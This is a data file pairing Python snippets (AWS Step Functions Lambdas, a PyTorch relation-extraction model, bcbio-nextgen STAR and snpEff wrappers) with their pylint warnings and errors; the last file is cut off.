1 - warning: unused-argument
"
"1   def lambda_handler(event, context):
2       if event['parallel_no'] == 1:
3           raise Exception('強制的にエラーとします')
4   
5       return 'only 3rd message.'
","3 - warning: broad-exception-raised
1 - warning: unused-argument
"
"1   #!/usr/bin/env python3
2   
3   from aws_cdk import core
4   
5   from step_functions.step_functions_stack import StepFunctionsStack
6   
7   
8   app = core.App()
9   
10   # CFnのStack名を第2引数で渡す
11   StepFunctionsStack(app, 'step-functions')
12   
13   app.synth()
","Clean Code: No Issues Detected
"
"1   import json
2   
3   
4   def lambda_handler(event, context):
5       # {
6       #   ""resource"": ""arn:aws:lambda:region:id:function:sfn_error_lambda"",
7       #   ""input"": {
8       #     ""Error"": ""Exception"",
9       #     ""Cause"": ""{\""errorMessage\"": \""\\u5076\\u6570\\u3067\\u3059\"",
10       #                \""errorType\"": \""Exception\"",
11       #                \""stackTrace\"": [\""  File \\\""/var/task/lambda_function.py\\\"", line 5,
12       #                   in lambda_handler\\n    raise Exception('\\u5076\\u6570\\u3067\\u3059')
13       #               \\n\""]}""
14       #   },
15       #   ""timeoutInSeconds"": null
16       # }
17   
18       return {
19           # JSONをPythonオブジェクト化することで、文字化けを直す
20           'error_message': json.loads(event['Cause']),
21       }
","4 - warning: unused-argument
"
"1   import os
2   import boto3
3   from numpy.random import rand
4   
5   
6   def lambda_handler(event, context):
7       body = f'{event[""message""]} \n value: {rand()}'
8       client = boto3.client('s3')
9       client.put_object(
10           Bucket=os.environ['BUCKET_NAME'],
11           Key='sfn_first.txt',
12           Body=body,
13       )
14   
15       return {
16           'body': body,
17           'message': event['message'],
18       }
","6 - warning: unused-argument
"
"1   import time
2   import cPickle
3   import numpy as np
4   import torch
5   
6   class InstanceBag(object):
7   	def __init__(self, entities, rel, num, sentences, positions, entitiesPos):
8   		self.entities = entities
9   		self.rel = rel
10   		self.num = num
11   		self.sentences = sentences
12   		self.positions = positions
13   		self.entitiesPos = entitiesPos
14   
15   def bags_decompose(data_bags):
16       bag_sent = [data_bag.sentences for data_bag in data_bags]
17       bag_pos = [data_bag.positions for data_bag in data_bags]
18       bag_num = [data_bag.num for data_bag in data_bags]
19       bag_rel = [data_bag.rel for data_bag in data_bags]
20       bag_epos = [data_bag.entitiesPos for data_bag in data_bags]
21       return [bag_rel, bag_num, bag_sent, bag_pos, bag_epos]
22   
23   def select_instance(rels, nums, sents, poss, eposs, model):
24       batch_x = []
25       batch_len = []
26       batch_epos = []
27       batch_y = []
28       for bagIndex, insNum in enumerate(nums):
29           maxIns = 0
30           maxP = -1
31           if insNum > 1:
32               for m in range(insNum):
33               	insX = sents[bagIndex][m]
34                   epos = eposs[bagIndex][m]
35                   sel_x, sel_len, sel_epos = prepare_data([insX], [epos])
36                   results = model(sel_x, sel_len, sel_epos)
37                   tmpMax = results.max()
38                   if tmpMax > maxP:
39                       maxIns = m
40                       maxP=tmpMax
41   
42           batch_x.append(sents[bagIndex][maxIns])
43           batch_epos.append(eposs[bagIndex][maxIns])
44           batch_y.append(rels[bagIndex])
45       
46       batch_x, batch_len, batch_epos = prepare_data(batch_x, batch_epos)
47       batch_y = torch.LongTensor(np.array(batch_y).astype(""int32"")).cuda()
48   
49       return [batch_x, batch_len, batch_epos, batch_y]
50   
51   def prepare_data(sents, epos):
52       lens = [len(sent) for sent in sents]
53   
54       n_samples = len(lens)
55       max_len = max(lens)
56   
57       batch_x = np.zeros((n_samples, max_len)).astype(""int32"")
58       for idx, s in enumerate(sents):
59           batch_x[idx, :lens[idx]] = s
60   
61       batch_len = np.array(lens).astype(""int32"")
62       batch_epos = np.array(epos).astype(""int32"")
63   
64       return torch.LongTensor(batch_x).cuda(), torch.LongTensor(batch_len).cuda(), torch.LongTensor(batch_epos).cuda()
","34 - error: syntax-error
"
"1   import sys
2   import re
3   import numpy as np
4   import cPickle as pkl
5   import codecs
6   
7   import logging
8   
9   from data_iterator import *
10   
11   logger = logging.getLogger()
12   extra_token = [""<PAD>"", ""<UNK>""]
13   
14   def display(msg):
15   	print(msg)
16   	logger.info(msg)
17   
18   def datafold(filename):
19   	f = open(filename, 'r')
20   	data = []
21   	while 1:
22   		line = f.readline()
23   		if not line:
24   			break
25   		entities = map(int, line.split(' '))
26   		line = f.readline()
27   		bagLabel = line.split(' ')
28   
29   		rel = map(int, bagLabel[0:-1])
30   		num = int(bagLabel[-1])
31   		positions = []
32   		sentences = []
33   		entitiesPos = []
34   		for i in range(0, num):
35   			sent = f.readline().split(' ')
36   			positions.append(map(int, sent[0:2]))
37   			epos = map(int, sent[0:2])
38   			epos.sort()
39   			entitiesPos.append(epos)
40   			sentences.append(map(int, sent[2:-1]))
41   		ins = InstanceBag(entities, rel, num, sentences, positions, entitiesPos)
42   		data += [ins]
43   	f.close()
44   	return data
45   
46   def dicfold(textfile):
47   	vocab = []
48   	with codecs.open(textfile, ""r"", encoding = ""utf8"") as f:
49   		for line in f:
50   			line = line.strip()
51   			if line:
52   				vocab.append(line)
53   	return vocab
54   
55   def build_word2idx(vocab, textFile):
56   	msg = ""Building word2idx...""
57   	display(msg)
58   
59   	pre_train_emb = []
60   	part_point = len(vocab)
61   	
62   	if textFile:
63   		word2emb = load_emb(vocab, textFile)
64   
65   		pre_train_vocab = []
66   		un_pre_train_vocab = []
67   
68   		for word in vocab:
69   			if word in word2emb:
70   				pre_train_vocab.append(word)
71   				pre_train_emb.append(word2emb[word])
72   			else:
73   				un_pre_train_vocab.append(word)
74   		
75   		part_point = len(un_pre_train_vocab)
76   		un_pre_train_vocab.extend(pre_train_vocab)
77   		vocab = un_pre_train_vocab
78   
79   	word2idx = {}
80   	for v, k in enumerate(extra_token):
81   		word2idx[k] = v
82   
83   	for v, k in enumerate(vocab):
84   		word2idx[k] = v + 2
85   
86   	part_point += 2
87   
88   	return word2idx, pre_train_emb, part_point
89   
90   def load_emb(vocab, textFile):
91   	msg = 'load emb from ' + textFile
92   	display(msg)
93   
94   	vocab_set = set(vocab)
95   	word2emb = {}
96   
97   	emb_p = re.compile(r"" |\t"")
98   	count = 0
99   	with codecs.open(textFile, ""r"", ""utf8"") as filein:
100   		for line in filein:
101   			count += 1
102   			array = emb_p.split(line.strip())
103   			word = array[0]
104   			if word in vocab_set:
105   				vector = [float(array[i]) for i in range(1, len(array))]
106   				word2emb[word] = vector
107   	
108   	del vocab_set
109   	
110   	msg = ""find %d words in %s"" %(count, textFile)
111   	display(msg)
112   
113   	msg = ""Summary: %d words in the vocabulary and %d of them appear in the %s"" %(len(vocab), len(word2emb), textFile)
114   	display(msg)
115   
116   	return word2emb
117   
118   def positive_evaluation(predict_results):
119   	predict_y = predict_results[0]
120   	predict_y_prob = predict_results[1]
121   	y_given = predict_results[2]
122   
123   	positive_num = 0
124   	#find the number of positive examples
125   	for yi in range(y_given.shape[0]):
126   		if y_given[yi, 0] > 0:
127   			positive_num += 1
128   	# if positive_num == 0:
129   	#	  positive_num = 1
130   	# sort prob
131   	index = np.argsort(predict_y_prob)[::-1]
132   
133   	all_pre = [0]
134   	all_rec = [0]
135   	p_n = 0
136   	p_p = 0
137   	n_p = 0
138   	# print y_given.shape[0]
139   	for i in range(y_given.shape[0]):
140   		labels = y_given[index[i],:] # key given labels
141   		py = predict_y[index[i]] # answer
142   
143   		if labels[0] == 0:
144   			# NA bag
145   			if py > 0:
146   				n_p += 1
147   		else:
148   			# positive bag
149   			if py == 0:
150   				p_n += 1
151   			else:
152   				flag = False
153   				for j in range(y_given.shape[1]):
154   					if j == -1:
155   						break
156   					if py == labels[j]:
157   						flag = True # true positive
158   						break
159   					if flag:
160   						p_p += 1
161   		if (p_p+n_p) == 0:
162   			precision = 1
163   		else:
164   			precision = float(p_p)/(p_p+n_p)
165   		recall = float(p_p)/positive_num
166   		if precision != all_pre[-1] or recall != all_rec[-1]:
167   			all_pre.append(precision)
168   			all_rec.append(recall)
169   	return [all_pre[1:], all_rec[1:]]","15 - warning: bad-indentation
16 - warning: bad-indentation
19 - warning: bad-indentation
20 - warning: bad-indentation
21 - warning: bad-indentation
22 - warning: bad-indentation
23 - warning: bad-indentation
24 - warning: bad-indentation
25 - warning: bad-indentation
26 - warning: bad-indentation
27 - warning: bad-indentation
29 - warning: bad-indentation
30 - warning: bad-indentation
31 - warning: bad-indentation
32 - warning: bad-indentation
33 - warning: bad-indentation
34 - warning: bad-indentation
35 - warning: bad-indentation
36 - warning: bad-indentation
37 - warning: bad-indentation
38 - warning: bad-indentation
39 - warning: bad-indentation
40 - warning: bad-indentation
41 - warning: bad-indentation
42 - warning: bad-indentation
43 - warning: bad-indentation
44 - warning: bad-indentation
47 - warning: bad-indentation
48 - warning: bad-indentation
49 - warning: bad-indentation
50 - warning: bad-indentation
51 - warning: bad-indentation
52 - warning: bad-indentation
53 - warning: bad-indentation
56 - warning: bad-indentation
57 - warning: bad-indentation
59 - warning: bad-indentation
60 - warning: bad-indentation
62 - warning: bad-indentation
63 - warning: bad-indentation
65 - warning: bad-indentation
66 - warning: bad-indentation
68 - warning: bad-indentation
69 - warning: bad-indentation
70 - warning: bad-indentation
71 - warning: bad-indentation
72 - warning: bad-indentation
73 - warning: bad-indentation
75 - warning: bad-indentation
76 - warning: bad-indentation
77 - warning: bad-indentation
79 - warning: bad-indentation
80 - warning: bad-indentation
81 - warning: bad-indentation
83 - warning: bad-indentation
84 - warning: bad-indentation
86 - warning: bad-indentation
88 - warning: bad-indentation
91 - warning: bad-indentation
92 - warning: bad-indentation
94 - warning: bad-indentation
95 - warning: bad-indentation
97 - warning: bad-indentation
98 - warning: bad-indentation
99 - warning: bad-indentation
100 - warning: bad-indentation
101 - warning: bad-indentation
102 - warning: bad-indentation
103 - warning: bad-indentation
104 - warning: bad-indentation
105 - warning: bad-indentation
106 - warning: bad-indentation
108 - warning: bad-indentation
110 - warning: bad-indentation
111 - warning: bad-indentation
113 - warning: bad-indentation
114 - warning: bad-indentation
116 - warning: bad-indentation
119 - warning: bad-indentation
120 - warning: bad-indentation
121 - warning: bad-indentation
123 - warning: bad-indentation
125 - warning: bad-indentation
126 - warning: bad-indentation
127 - warning: bad-indentation
131 - warning: bad-indentation
133 - warning: bad-indentation
134 - warning: bad-indentation
135 - warning: bad-indentation
136 - warning: bad-indentation
137 - warning: bad-indentation
139 - warning: bad-indentation
140 - warning: bad-indentation
141 - warning: bad-indentation
143 - warning: bad-indentation
145 - warning: bad-indentation
146 - warning: bad-indentation
147 - warning: bad-indentation
149 - warning: bad-indentation
150 - warning: bad-indentation
151 - warning: bad-indentation
152 - warning: bad-indentation
153 - warning: bad-indentation
154 - warning: bad-indentation
155 - warning: bad-indentation
156 - warning: bad-indentation
157 - warning: bad-indentation
158 - warning: bad-indentation
159 - warning: bad-indentation
160 - warning: bad-indentation
161 - warning: bad-indentation
162 - warning: bad-indentation
163 - warning: bad-indentation
164 - warning: bad-indentation
165 - warning: bad-indentation
166 - warning: bad-indentation
167 - warning: bad-indentation
168 - warning: bad-indentation
169 - warning: bad-indentation
9 - warning: wildcard-import
19 - warning: unspecified-encoding
38 - error: no-member
41 - error: undefined-variable
19 - refactor: consider-using-with
34 - warning: unused-variable
118 - refactor: too-many-locals
118 - refactor: too-many-branches
1 - warning: unused-import
4 - warning: unused-import
"
"1   from module import *
2   from util import *
3   from data_iterator import *
","1 - warning: wildcard-import
2 - warning: wildcard-import
3 - warning: wildcard-import
"
"1   import sys
2   import codecs
3   
4   class InstanceBag(object):
5   	def __init__(self, entities, rel, num, sentences, positions, entitiesPos):
6   		self.entities = entities
7   		self.rel = rel
8   		self.num = num
9   		self.sentences = sentences
10   		self.positions = positions
11   		self.entitiesPos = entitiesPos
12   
13   def bags_decompose(data_bags):
14       bag_sent = [data_bag.sentences for data_bag in data_bags]
15       bag_pos = [data_bag.positions for data_bag in data_bags]
16       bag_num = [data_bag.num for data_bag in data_bags]
17       bag_rel = [data_bag.rel for data_bag in data_bags]
18       bag_epos = [data_bag.entitiesPos for data_bag in data_bags]
19       return [bag_rel, bag_num, bag_sent, bag_pos, bag_epos]
20   
21   def datafold(filename):
22   	f = open(filename, 'r')
23   	data = []
24   	while 1:
25   		line = f.readline()
26   		if not line:
27   			break
28   		entities = map(int, line.split(' '))
29   		line = f.readline()
30   		bagLabel = line.split(' ')
31   
32   		rel = map(int, bagLabel[0:-1])
33   		num = int(bagLabel[-1])
34   		positions = []
35   		sentences = []
36   		entitiesPos = []
37   		for i in range(0, num):
38   			sent = f.readline().split(' ')
39   			positions.append(map(int, sent[0:2]))
40   			epos = map(int, sent[0:2])
41   			epos.sort()
42   			entitiesPos.append(epos)
43   			sentences.append(map(int, sent[2:-1]))
44   		ins = InstanceBag(entities, rel, num, sentences, positions, entitiesPos)
45   		data += [ins]
46   	f.close()
47   	return data
48   
49   def change_word_idx(data):
50   	new_data = []
51   	for inst in data:
52   		entities = inst.entities
53   		rel = inst.rel
54   		num = inst.num
55   		sentences = inst.sentences
56   		positions = inst.positions
57   		entitiesPos = inst.entitiesPos
58   		new_sentences = []
59   		for sent in sentences:
60   			new_sent = []
61   			for word in sent:
62   				if word == 160696:
63   					new_sent.append(1)
64   				elif word == 0:
65   					new_sent.append(0)
66   				else:
67   					new_sent.append(word + 1)
68   			new_sentences.append(new_sent)
69   		new_inst = InstanceBag(entities, rel, num, new_sentences, positions, entitiesPos)
70   		new_data.append(new_inst)
71   	return new_data
72   
73   def save_data(data, textfile):
74   	with codecs.open(textfile, ""w"", encoding = ""utf8"") as f:
75   		for inst in data:
76   			f.write(""%s\n"" %("" "".join(map(str, inst.entities))))
77   			f.write(""%s %s\n"" %("" "".join(map(str, inst.rel)), str(inst.num)))
78   			for pos, sent in zip(inst.positions, inst.sentences):
79   				f.write(""%s %s\n"" %("" "".join(map(str, pos)), "" "".join(map(str, sent))))
80   
81   def main(argv):
82   	data = datafold(argv[0])
83   	new_data = change_word_idx(data)
84   	save_data(new_data, argv[1])
85   
86   if ""__main__"" == __name__:
87   	main(sys.argv[1:])","5 - warning: bad-indentation
6 - warning: bad-indentation
7 - warning: bad-indentation
8 - warning: bad-indentation
9 - warning: bad-indentation
10 - warning: bad-indentation
11 - warning: bad-indentation
22 - warning: bad-indentation
23 - warning: bad-indentation
24 - warning: bad-indentation
25 - warning: bad-indentation
26 - warning: bad-indentation
27 - warning: bad-indentation
28 - warning: bad-indentation
29 - warning: bad-indentation
30 - warning: bad-indentation
32 - warning: bad-indentation
33 - warning: bad-indentation
34 - warning: bad-indentation
35 - warning: bad-indentation
36 - warning: bad-indentation
37 - warning: bad-indentation
38 - warning: bad-indentation
39 - warning: bad-indentation
40 - warning: bad-indentation
41 - warning: bad-indentation
42 - warning: bad-indentation
43 - warning: bad-indentation
44 - warning: bad-indentation
45 - warning: bad-indentation
46 - warning: bad-indentation
47 - warning: bad-indentation
50 - warning: bad-indentation
51 - warning: bad-indentation
52 - warning: bad-indentation
53 - warning: bad-indentation
54 - warning: bad-indentation
55 - warning: bad-indentation
56 - warning: bad-indentation
57 - warning: bad-indentation
58 - warning: bad-indentation
59 - warning: bad-indentation
60 - warning: bad-indentation
61 - warning: bad-indentation
62 - warning: bad-indentation
63 - warning: bad-indentation
64 - warning: bad-indentation
65 - warning: bad-indentation
66 - warning: bad-indentation
67 - warning: bad-indentation
68 - warning: bad-indentation
69 - warning: bad-indentation
70 - warning: bad-indentation
71 - warning: bad-indentation
74 - warning: bad-indentation
75 - warning: bad-indentation
76 - warning: bad-indentation
77 - warning: bad-indentation
78 - warning: bad-indentation
79 - warning: bad-indentation
82 - warning: bad-indentation
83 - warning: bad-indentation
84 - warning: bad-indentation
87 - warning: bad-indentation
4 - refactor: useless-object-inheritance
5 - refactor: too-many-arguments
5 - refactor: too-many-positional-arguments
4 - refactor: too-few-public-methods
22 - warning: unspecified-encoding
41 - error: no-member
22 - refactor: consider-using-with
37 - warning: unused-variable
"
"1   import torch
2   import torch.nn as nn
3   
4   from lib import *
5   
6   class Model(nn.Module):
7   	def __init__(self,
8   				 fine_tune,
9   				 pre_train_emb,
10   				 part_point,
11   				 size_vocab,
12   				 dim_emb,                                                                                                                                                                                   
13   				 dim_proj,
14   				 head_count,  
15   				 dim_FNN, 
16   				 act_str,
17   				 num_layer,
18   				 num_class,
19   				 dropout_rate):
20   		super(Model, self).__init__()
21   
22   		self.fine_tune = fine_tune
23   		self.pre_train_emb = pre_train_emb
24   		self.part_point = part_point
25   		self.size_vocab = size_vocab
26   		self.dim_emb = dim_emb
27   		self.dim_proj = dim_proj
28   		self.head_count = head_count
29   		self.dim_FNN = dim_FNN
30   		self.act_str = act_str
31   		self.num_layer = num_layer
32   		self.num_class = num_class
33   		self.dropout_rate = dropout_rate
34   
35   		self._init_params()
36   
37   	def _init_params(self):
38   		self.wemb = Word_Emb(self.fine_tune,
39   							 self.pre_train_emb,
40   							 self.part_point,
41   							 self.size_vocab,   
42   							 self.dim_emb)                                       
43   
44   		self.encoder = TransformerEncoder(self.dim_proj,
45   										  self.head_count,
46   										  self.dim_FNN,
47   										  self.act_str,
48   										  self.num_layer,
49   									       	  self.dropout_rate)
50   
51   		self.dense = MLP(self.dim_proj * 3, self.dim_proj)
52   		self.relu = torch.nn.ReLU()
53   		self.classifier = MLP(self.dim_proj, self.num_class)
54   		self.dropout = nn.Dropout(self.dropout_rate)
55   
56   	def forward(self, inp, lengths, epos):                                      
57   		mask, mask_l, mask_m, mask_r = self.pos2mask(epos, lengths)
58   
59   		emb_inp = self.wemb(inp)
60   		emb_inp = self.dropout(emb_inp)
61   
62   		proj_inp, _ = self.encoder(emb_inp, self.create_attention_mask(mask, mask))
63   		proj_inp = proj_inp * mask[:, :, None]
64   
65   		pool_inp_l = torch.sum(proj_inp * mask_l[:, :, None], dim = 1) / torch.sum(mask_l, dim = 1)[:, None]
66   		pool_inp_m = torch.sum(proj_inp * mask_m[:, :, None], dim = 1) / torch.sum(mask_m, dim = 1)[:, None]
67   		pool_inp_r = torch.sum(proj_inp * mask_r[:, :, None], dim = 1) / torch.sum(mask_r, dim = 1)[:, None]
68   
69   		pool_inp = torch.cat([pool_inp_l, pool_inp_m, pool_inp_r], dim = 1)
70   
71   		pool_inp = self.dropout(pool_inp)
72   
73   		logit = self.relu(self.dense(pool_inp))  
74   
75   		logit = self.dropout(logit)
76   
77   		logit = self.classifier(logit)
78   
79   		return logit
80   
81   	def pos2mask(self, epos, lengths):
82   		mask = self.len2mask(lengths)
83   
84   		nsample = lengths.size()[0]
85   		max_len = torch.max(lengths)
86   		idxes = torch.arange(0, max_len).cuda() 
87   		mask_l = (idxes < epos[:, 0].unsqueeze(1)).float()
88   		mask_r = mask - (idxes < epos[:, 1].unsqueeze(1)).float()
89   		mask_m = torch.ones([nsample, max_len]).float().cuda() - mask_l - mask_r
90   		return mask, mask_l, mask_m, mask_r
91   
92   	def len2mask(self, lengths):
93   		max_len = torch.max(lengths)
94   		idxes = torch.arange(0, max_len).cuda()
95   		mask = (idxes < lengths.unsqueeze(1)).float()
96   		return mask
97   
98   	def create_attention_mask(self, query_mask, key_mask):
99   		return torch.matmul(query_mask[:, :, None], key_mask[:, None, :]).byte()","7 - warning: bad-indentation
20 - warning: bad-indentation
22 - warning: bad-indentation
23 - warning: bad-indentation
24 - warning: bad-indentation
25 - warning: bad-indentation
26 - warning: bad-indentation
27 - warning: bad-indentation
28 - warning: bad-indentation
29 - warning: bad-indentation
30 - warning: bad-indentation
31 - warning: bad-indentation
32 - warning: bad-indentation
33 - warning: bad-indentation
35 - warning: bad-indentation
37 - warning: bad-indentation
38 - warning: bad-indentation
44 - warning: bad-indentation
51 - warning: bad-indentation
52 - warning: bad-indentation
53 - warning: bad-indentation
54 - warning: bad-indentation
56 - warning: bad-indentation
57 - warning: bad-indentation
59 - warning: bad-indentation
60 - warning: bad-indentation
62 - warning: bad-indentation
63 - warning: bad-indentation
65 - warning: bad-indentation
66 - warning: bad-indentation
67 - warning: bad-indentation
69 - warning: bad-indentation
71 - warning: bad-indentation
73 - warning: bad-indentation
75 - warning: bad-indentation
77 - warning: bad-indentation
79 - warning: bad-indentation
81 - warning: bad-indentation
82 - warning: bad-indentation
84 - warning: bad-indentation
85 - warning: bad-indentation
86 - warning: bad-indentation
87 - warning: bad-indentation
88 - warning: bad-indentation
89 - warning: bad-indentation
90 - warning: bad-indentation
92 - warning: bad-indentation
93 - warning: bad-indentation
94 - warning: bad-indentation
95 - warning: bad-indentation
96 - warning: bad-indentation
98 - warning: bad-indentation
99 - warning: bad-indentation
2 - refactor: consider-using-from-import
4 - warning: wildcard-import
6 - refactor: too-many-instance-attributes
7 - refactor: too-many-arguments
7 - refactor: too-many-positional-arguments
20 - refactor: super-with-arguments
38 - error: undefined-variable
44 - error: undefined-variable
51 - error: undefined-variable
53 - error: undefined-variable
"
"1   from os import path
2   
3   from bcbio.pipeline import config_utils
4   from bcbio.utils import safe_makedir, file_exists, get_in
5   from bcbio.provenance import do
6   
7   CLEANUP_FILES = [""Aligned.out.sam"", ""Log.out"", ""Log.progress.out""]
8   
9   def align(fastq_file, pair_file, ref_file, names, align_dir, data):
10       config = data[""config""]
11       out_prefix = path.join(align_dir, names[""lane""])
12       out_file = out_prefix + ""Aligned.out.sam""
13       if file_exists(out_file):
14           return out_file
15       star_path = config_utils.get_program(""STAR"", config)
16       fastq = "" "".join([fastq_file, pair_file]) if pair_file else fastq_file
17       num_cores = config[""algorithm""].get(""num_cores"", 1)
18   
19       safe_makedir(align_dir)
20       cmd = (""{star_path} --genomeDir {ref_file} --readFilesIn {fastq} ""
21              ""--runThreadN {num_cores} --outFileNamePrefix {out_prefix} ""
22              ""--outReadsUnmapped Fastx --outFilterMultimapNmax 10"")
23       fusion_mode = get_in(data, (""config"", ""algorithm"", ""fusion_mode""), False)
24       if fusion_mode:
25           cmd += "" --chimSegmentMin 15 --chimJunctionOverhangMin 15""
26       strandedness = get_in(data, (""config"", ""algorithm"", ""strandedness""),
27                             ""unstranded"").lower()
28       if strandedness == ""unstranded"":
29           cmd += "" --outSAMstrandField intronMotif""
30       run_message = ""Running STAR aligner on %s and %s."" % (pair_file, ref_file)
31       do.run(cmd.format(**locals()), run_message, None)
32       return out_file
33   
34   def _get_quality_format(config):
35       qual_format = config[""algorithm""].get(""quality_format"", None)
36       if qual_format.lower() == ""illumina"":
37           return ""fastq-illumina""
38       elif qual_format.lower() == ""solexa"":
39           return ""fastq-solexa""
40       else:
41           return ""fastq-sanger""
42   
43   def remap_index_fn(ref_file):
44       """"""Map sequence references to equivalent star indexes
45       """"""
46       return path.join(path.dirname(path.dirname(ref_file)), ""star"")
47   
48   def job_requirements(cores, memory):
49       MIN_STAR_MEMORY = 30.0
50       if not memory or cores * memory < MIN_STAR_MEMORY:
51           memory = MIN_STAR_MEMORY / cores
52       return cores, memory
53   
54   align.job_requirements = job_requirements
","9 - refactor: too-many-arguments
9 - refactor: too-many-positional-arguments
9 - refactor: too-many-locals
15 - warning: possibly-unused-variable
16 - warning: possibly-unused-variable
17 - warning: possibly-unused-variable
36 - refactor: no-else-return
"
"1   """"""Calculate potential effects of variations using external programs.
2   
3   Supported:
4     snpEff: http://sourceforge.net/projects/snpeff/
5   """"""
6   import os
7   import csv
8   import glob
9   
10   from bcbio import utils
11   from bcbio.distributed.transaction import file_transaction
12   from bcbio.pipeline import config_utils, tools
13   from bcbio.provenance import do
14   from bcbio.variation import vcfutils
15   
16   # ## snpEff variant effects
17   
18   def snpeff_effects(data):
19       """"""Annotate input VCF file with effects calculated by snpEff.
20       """"""
21       vcf_in = data[""vrn_file""]
22       interval_file = data[""config""][""algorithm""].get(""variant_regions"", None)
23       if vcfutils.vcf_has_variants(vcf_in):
24           se_interval = (_convert_to_snpeff_interval(interval_file, vcf_in)
25                          if interval_file else None)
26           try:
27               vcf_file = _run_snpeff(vcf_in, se_interval, ""vcf"", data)
28           finally:
29               for fname in [se_interval]:
30                   if fname and os.path.exists(fname):
31                       os.remove(fname)
32           return vcf_file
33   
34   def _snpeff_args_from_config(data):
35       """"""Retrieve snpEff arguments supplied through input configuration.
36       """"""
37       config = data[""config""]
38       args = []
39       # General supplied arguments
40       resources = config_utils.get_resources(""snpeff"", config)
41       if resources.get(""options""):
42           args += [str(x) for x in resources.get(""options"", [])]
43       # cancer specific calling arguments
44       if data.get(""metadata"", {}).get(""phenotype"") in [""tumor"", ""normal""]:
45           args += [""-cancer""]
46       # Provide options tuned to reporting variants in clinical environments
47       if config[""algorithm""].get(""clinical_reporting""):
48           args += [""-canon"", ""-hgvs""]
49       return args
50   
51   def get_db(ref_file, resources, config=None):
52       """"""Retrieve a snpEff database name and location relative to reference file.
53       """"""
54       snpeff_db = resources.get(""aliases"", {}).get(""snpeff"")
55       if snpeff_db:
56           snpeff_base_dir = utils.safe_makedir(os.path.normpath(os.path.join(
57               os.path.dirname(os.path.dirname(ref_file)), ""snpeff"")))
58           # back compatible retrieval of genome from installation directory
59           if config and not os.path.exists(os.path.join(snpeff_base_dir, snpeff_db)):
60               snpeff_base_dir, snpeff_db = _installed_snpeff_genome(snpeff_db, config)
61       else:
62           snpeff_base_dir = None
63       return snpeff_db, snpeff_base_dir
64   
65   def get_cmd(cmd_name, datadir, config):
66       """"""Retrieve snpEff base command line, handling command line and jar based installs.
67       """"""
68       resources = config_utils.get_resources(""snpeff"", config)
69       memory = "" "".join(resources.get(""jvm_opts"", [""-Xms750m"", ""-Xmx5g""]))
70       try:
71           snpeff = config_utils.get_program(""snpeff"", config)
72           cmd = ""{snpeff} {memory} {cmd_name} -dataDir {datadir}""
73       except config_utils.CmdNotFound:
74           snpeff_jar = config_utils.get_jar(""snpEff"",
75                                             config_utils.get_program(""snpeff"", config, ""dir""))
76           config_file = ""%s.config"" % os.path.splitext(snpeff_jar)[0]
77           cmd = ""java {memory} -jar {snpeff_jar} {cmd_name} -c {config_file} -dataDir {datadir}""
78       return cmd.format(**locals())
79   
80   def _run_snpeff(snp_in, se_interval, out_format, data):
81       snpeff_db, datadir = get_db(data[""sam_ref""], data[""genome_resources""], data[""config""])
82       assert datadir is not None, \
83           ""Did not find snpEff resources in genome configuration: %s"" % data[""genome_resources""]
84       assert os.path.exists(os.path.join(datadir, snpeff_db)), \
85           ""Did not find %s snpEff genome data in %s"" % (snpeff_db, datadir)
86       snpeff_cmd = get_cmd(""eff"", datadir, data[""config""])
87       ext = utils.splitext_plus(snp_in)[1] if out_format == ""vcf"" else "".tsv""
88       out_file = ""%s-effects%s"" % (utils.splitext_plus(snp_in)[0], ext)
89       if not utils.file_exists(out_file):
90           interval = ""-filterinterval %s"" % (se_interval) if se_interval else """"
91           config_args = "" "".join(_snpeff_args_from_config(data))
92           if ext.endswith("".gz""):
93               bgzip_cmd = ""| %s -c"" % tools.get_bgzip_cmd(data[""config""])
94           else:
95               bgzip_cmd = """"
96           with file_transaction(out_file) as tx_out_file:
97               cmd = (""{snpeff_cmd} {interval} {config_args} -noLog -1 -i vcf -o {out_format} ""
98                      ""{snpeff_db} {snp_in} {bgzip_cmd} > {tx_out_file}"")
99               do.run(cmd.format(**locals()), ""snpEff effects"", data)
100       if ext.endswith("".gz""):
101           out_file = vcfutils.bgzip_and_index(out_file, data[""config""])
102       return out_file
103   
104   def _convert_to_snpeff_interval(in_file, base_file):
105       """"""Handle wide variety of BED-like inputs, converting to BED-3.
106       """"""
107       out_file = ""%s-snpeff-intervals.bed"" % utils.splitext_plus(base_file)[0]
108       if not os.path.exists(out_file):
109           with open(out_file, ""w"") as out_handle:
110               writer = csv.writer(out_handle, dialect=""excel-tab"")
111               with open(in_file) as in_handle:
112                   for line in (l for l in in_handle if not l.startswith((""@"", ""#""))):
113                       parts = line.split()
114                       writer.writerow(parts[:3])
115       return out_file
116   
117   # ## back-compatibility
118   
119   def _find_snpeff_datadir(config_file):
120       with open(config_file) as in_handle:
121           for line in in_handle:
122               if line.startswith(""data_dir""):
123                   data_dir = config_utils.expand_path(line.split(""="")[-1].strip())
124                   if not data_dir.startswith(""/""):
125                       data_dir = os.path.join(os.path.dirname(config_file), data_dir)
126                   return data_dir
127       raise ValueError(""Did not find data directory in snpEff config file: %s"" % config_file)
128   
129   def _installed_snpeff_genome(base_name, config):
130       """"""Find the most recent installed genome for snpEff with the given name.
131       """"""
132       snpeff_config_file = os.path.join(config_utils.get_program(""snpEff"", config, ""dir""),
133                                         ""snpEff.config"")
134       data_dir = _find_snpeff_datadir(snpeff_config_file)
135       dbs = [d for d in sorted(glob.glob(os.path.join(data_dir, ""%s*"" % base_name)), reverse=True)
136              if os.path.isdir(d)]
137       if len(dbs) == 0:
138           raise ValueError(""No database found in %s for %s"" % (data_dir, base_name))
139       else:
140           return data_dir, os.path.split(dbs[0])[-1]
","18 - refactor: inconsistent-return-statements
65 - warning: unused-argument
65 - warning: unused-argument
69 - warning: possibly-unused-variable
71 - warning: possibly-unused-variable
76 - warning: possibly-unused-variable
86 - warning: possibly-unused-variable
90 - warning: possibly-unused-variable
91 - warning: possibly-unused-variable
93 - warning: possibly-unused-variable
96 - warning: possibly-unused-variable
109 - warning: unspecified-encoding
111 - warning: unspecified-encoding
120 - warning: unspecified-encoding
137 - refactor: no-else-raise
"
"1   """"""Run distributed functions provided a name and json/YAML file with arguments.
2   
3   Enables command line access and alternative interfaces to run specific
4   functionality within bcbio-nextgen.
5   """"""
6   import yaml
7   
8   from bcbio.distributed import multitasks
9   
10   def process(args):
11       """"""Run the function in args.name given arguments in args.argfile.
12       """"""
13       try:
14           fn = getattr(multitasks, args.name)
15       except AttributeError:
16           raise AttributeError(""Did not find exposed function in bcbio.distributed.multitasks named '%s'"" % args.name)
17       with open(args.argfile) as in_handle:
18           fnargs = yaml.safe_load(in_handle)
19       fn(fnargs)
20   
21   def add_subparser(subparsers):
